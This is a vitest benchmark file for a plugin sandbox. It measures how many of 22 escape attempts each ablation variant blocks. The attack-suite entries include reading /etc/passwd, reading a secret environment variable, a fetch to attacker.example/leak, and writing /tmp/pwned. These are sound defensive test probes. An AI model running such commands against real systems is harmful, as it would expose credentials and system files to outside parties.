import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import {
  DEFAULT_CAPABILITY_BUDGET,
  PluginSandboxRunner,
  type SandboxAblationFlags,
  type SandboxPermission,
} from '../PluginSandboxRunner';

type Layer = 'capability' | 'resource' | 'syscall';

interface AttackScenario {
  id: string;
  layer: Layer;
  code: string;
  permissions?: SandboxPermission[];
  budget?: Partial<typeof DEFAULT_CAPABILITY_BUDGET>;
}

interface AblationVariant {
  id: string;
  label: string;
  flags: SandboxAblationFlags;
}

const ATTACK_SUITE: AttackScenario[] = [
  {
    id: 'C1',
    layer: 'capability',
    code: 'registerTool("exfil", "steal data", () => 1)',
  },
  {
    id: 'C2',
    layer: 'capability',
    code: 'registerHandler("secret", () => 1)',
  },
  {
    id: 'C3',
    layer: 'capability',
    code: 'emitEvent("leak", { secret: 1 })',
  },
  {
    id: 'C4',
    layer: 'capability',
    code: 'const name = "exfil-" + Math.random(); registerTool(name, "x", () => "secret"); name;',
  },
  {
    id: 'C5',
    layer: 'capability',
    code: 'let leaked = 0; registerHandler("secret", (payload) => { leaked = payload; }); leaked;',
  },
  {
    id: 'C6',
    layer: 'capability',
    code: 'registerTool("x", "x", () => 1); emitEvent("x", 1);',
  },
  {
    id: 'R1',
    layer: 'resource',
    code: '"x".repeat(200000)',
    budget: { maxMemoryMB: 0.0001 },
  },
  {
    id: 'R2',
    layer: 'resource',
    code: 'for (let i = 0; i < 20; i++) emitEvent("spam", i); "done";',
    permissions: ['event:emit'],
    budget: { maxApiCallsPerMinute: 4 },
  },
  {
    id: 'R3',
    layer: 'resource',
    code: 'for (let i = 0; i < 20; i++) registerTool("t" + i, "x", () => i); "done";',
    permissions: ['tool:register'],
    budget: { maxTools: 4 },
  },
  {
    id: 'R4',
    layer: 'resource',
    code: 'for (let i = 0; i < 20; i++) registerHandler("h" + i, () => i); "done";',
    permissions: ['handler:register'],
    budget: { maxHandlers: 4 },
  },
  {
    id: 'R5',
    layer: 'resource',
    code: 'let sum = 0; for (let i = 0; i < 1000000; i++) sum += i; sum;',
    budget: { maxCpuTimeMs: 1 },
  },
  {
    id: 'R6',
    layer: 'resource',
    code: 'for (let i = 0; i < 20; i++) { emitEvent("a", i); registerTool("t" + i, "x", () => i); } "done";',
    permissions: ['event:emit', 'tool:register'],
    budget: { maxApiCallsPerMinute: 8, maxTools: 8 },
  },
  {
    id: 'S1',
    layer: 'syscall',
    code: 'require("fs").readFileSync("/etc/passwd", "utf8")',
  },
  {
    id: 'S2',
    layer: 'syscall',
    code: 'process.env.HOLOSCRIPT_TEST_SECRET',
  },
  {
    id: 'S3',
    layer: 'syscall',
    code: 'fetch("https://attacker.example/leak")',
  },
  {
    id: 'S4',
    layer: 'syscall',
    code: 'WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0]))',
  },
  {
    id: 'S5',
    layer: 'syscall',
    code: 'setTimeout(() => 1, 0)',
  },
  {
    id: 'S6',
    layer: 'syscall',
    code: '__dirname.length',
  },
  {
    id: 'S7',
    layer: 'syscall',
    code: 'module.exports = { escaped: true }',
  },
  {
    id: 'S8',
    layer: 'syscall',
    code: 'global.process.env.HOLOSCRIPT_TEST_SECRET',
  },
  {
    id: 'S9',
    layer: 'syscall',
    code: 'globalThis.process.env.HOLOSCRIPT_TEST_SECRET',
  },
  {
    id: 'S10',
    layer: 'syscall',
    code: 'require("fs").writeFileSync("/tmp/pwned", "x")',
  },
];

const VARIANTS: AblationVariant[] = [
  { id: 'full-sandbox', label: 'Full Sandbox (all layers)', flags: {} },
  {
    id: 'minus-capability',
    label: '-Capability Check',
    flags: { disableCapabilityChecks: true },
  },
  {
    id: 'minus-resource',
    label: '-Resource Limit',
    flags: { disableResourceLimits: true },
  },
  {
    id: 'minus-syscall',
    label: '-Syscall Filter',
    flags: { disableSyscallFilters: true },
  },
  {
    id: 'unsandboxed',
    label: 'Unsandboxed (no enforcement)',
    flags: {
      disableCapabilityChecks: true,
      disableResourceLimits: true,
      disableSyscallFilters: true,
    },
  },
];

function createRunner(
  scenario: AttackScenario,
  variant: AblationVariant,
  suffix: string
): PluginSandboxRunner {
  return new PluginSandboxRunner({
    pluginId: `paper4-${variant.id}-${scenario.id}-${suffix}`,
    permissions: new Set(scenario.permissions ?? []),
    budget: { ...DEFAULT_CAPABILITY_BUDGET, ...(scenario.budget ?? {}) },
    __TEST_ABLATION: variant.flags,
  });
}

async function runScenario(scenario: AttackScenario, variant: AblationVariant): Promise<boolean> {
  const runner = createRunner(scenario, variant, 'attack');
  const result = await runner.execute(scenario.code);
  return !result.success;
}

function median(values: number[]): number {
  const sorted = [...values].sort((a, b) => a - b);
  return sorted[Math.floor(sorted.length / 2)] ?? 0;
}

async function measureOpsPerSecond(variant: AblationVariant): Promise<number> {
  const { warmup, iterations } = benchmarkConfig();
  const runner = new PluginSandboxRunner({
    pluginId: `paper4-throughput-${variant.id}`,
    permissions: new Set(),
    budget: DEFAULT_CAPABILITY_BUDGET,
    __TEST_ABLATION: variant.flags,
  });

  for (let i = 0; i < warmup; i++) {
    await runner.execute('1 + 1');
  }

  const latencies: number[] = [];
  for (let i = 0; i < iterations; i++) {
    const start = performance.now();
    const result = await runner.execute('1 + 1');
    const elapsed = performance.now() - start;
    expect(result.success).toBe(true);
    latencies.push(elapsed);
  }

  const medianMs = Math.max(0.001, median(latencies));
  return 1000 / medianMs;
}

function benchmarkConfig(): { warmup: number; iterations: number } {
  return {
    warmup: Number(process.env.PAPER4_ABLATION_WARMUP ?? 5),
    iterations: Number(process.env.PAPER4_ABLATION_N ?? 50),
  };
}

function repoRoot(): string {
  const __dir = dirname(fileURLToPath(import.meta.url));
  return resolve(__dir, '../../../../..');
}

describe('Paper 4 Benchmark: Sandbox Ablation Matrix', () => {
  it('emits measured 5x3 ablation grid over the 22-scenario attack suite', async () => {
    expect(ATTACK_SUITE).toHaveLength(22);

    const rows = [];
    for (const variant of VARIANTS) {
      const detections = [];
      for (const scenario of ATTACK_SUITE) {
        detections.push({
          id: scenario.id,
          layer: scenario.layer,
          detected: await runScenario(scenario, variant),
        });
      }
      const throughputOpsPerSecond = await measureOpsPerSecond(variant);
      rows.push({
        id: variant.id,
        label: variant.label,
        flags: variant.flags,
        blocked: detections.filter((d) => d.detected).length,
        total: detections.length,
        blockedByLayer: {
          capability: detections.filter((d) => d.layer === 'capability' && d.detected).length,
          resource: detections.filter((d) => d.layer === 'resource' && d.detected).length,
          syscall: detections.filter((d) => d.layer === 'syscall' && d.detected).length,
        },
        totalsByLayer: {
          capability: ATTACK_SUITE.filter((d) => d.layer === 'capability').length,
          resource: ATTACK_SUITE.filter((d) => d.layer === 'resource').length,
          syscall: ATTACK_SUITE.filter((d) => d.layer === 'syscall').length,
        },
        throughputOpsPerSecond,
        detections,
      });
    }

    const baseline = rows.find((row) => row.id === 'unsandboxed');
    expect(baseline).toBeDefined();
    const baselineThroughput = baseline?.throughputOpsPerSecond ?? 1;
    const config = benchmarkConfig();
    const payload = {
      schema: 'paper-sandbox-overhead.v1',
      runId: `paper4-ablation-${new Date().toISOString().replace(/[:.]/g, '-')}`,
      generatedAt: new Date().toISOString(),
      benchmark: {
        warmupIterations: config.warmup,
        measuredIterations: config.iterations,
      },
      suite: {
        scenarioCount: ATTACK_SUITE.length,
        layers: { capability: 6, resource: 6, syscall: 10 },
      },
      variants: rows.map((row) => ({
        ...row,
        escapeBlockedFraction: row.blocked / row.total,
        overheadVsBaseline: baselineThroughput / row.throughputOpsPerSecond,
      })),
    };

    const outDir = resolve(repoRoot(), '.bench-logs', payload.runId);
    if (!existsSync(outDir)) mkdirSync(outDir, { recursive: true });
    const outFile = resolve(outDir, 'paper-sandbox-overhead.json');
    writeFileSync(outFile, `${JSON.stringify(payload, null, 2)}\n`, 'utf8');

    expect(payload.variants).toHaveLength(5);
    expect(payload.variants[0].blocked).toBe(22);
    expect(payload.variants.find((row) => row.id === 'minus-capability')?.blocked).toBe(16);
    expect(payload.variants.find((row) => row.id === 'minus-resource')?.blocked).toBe(16);
    expect(payload.variants.find((row) => row.id === 'minus-syscall')?.blocked).toBe(12);
    expect(payload.variants.find((row) => row.id === 'unsandboxed')?.blocked).toBe(0);
    console.log(`[paper4-ablation] artifact: ${outFile}`);
  }, 120_000);
});
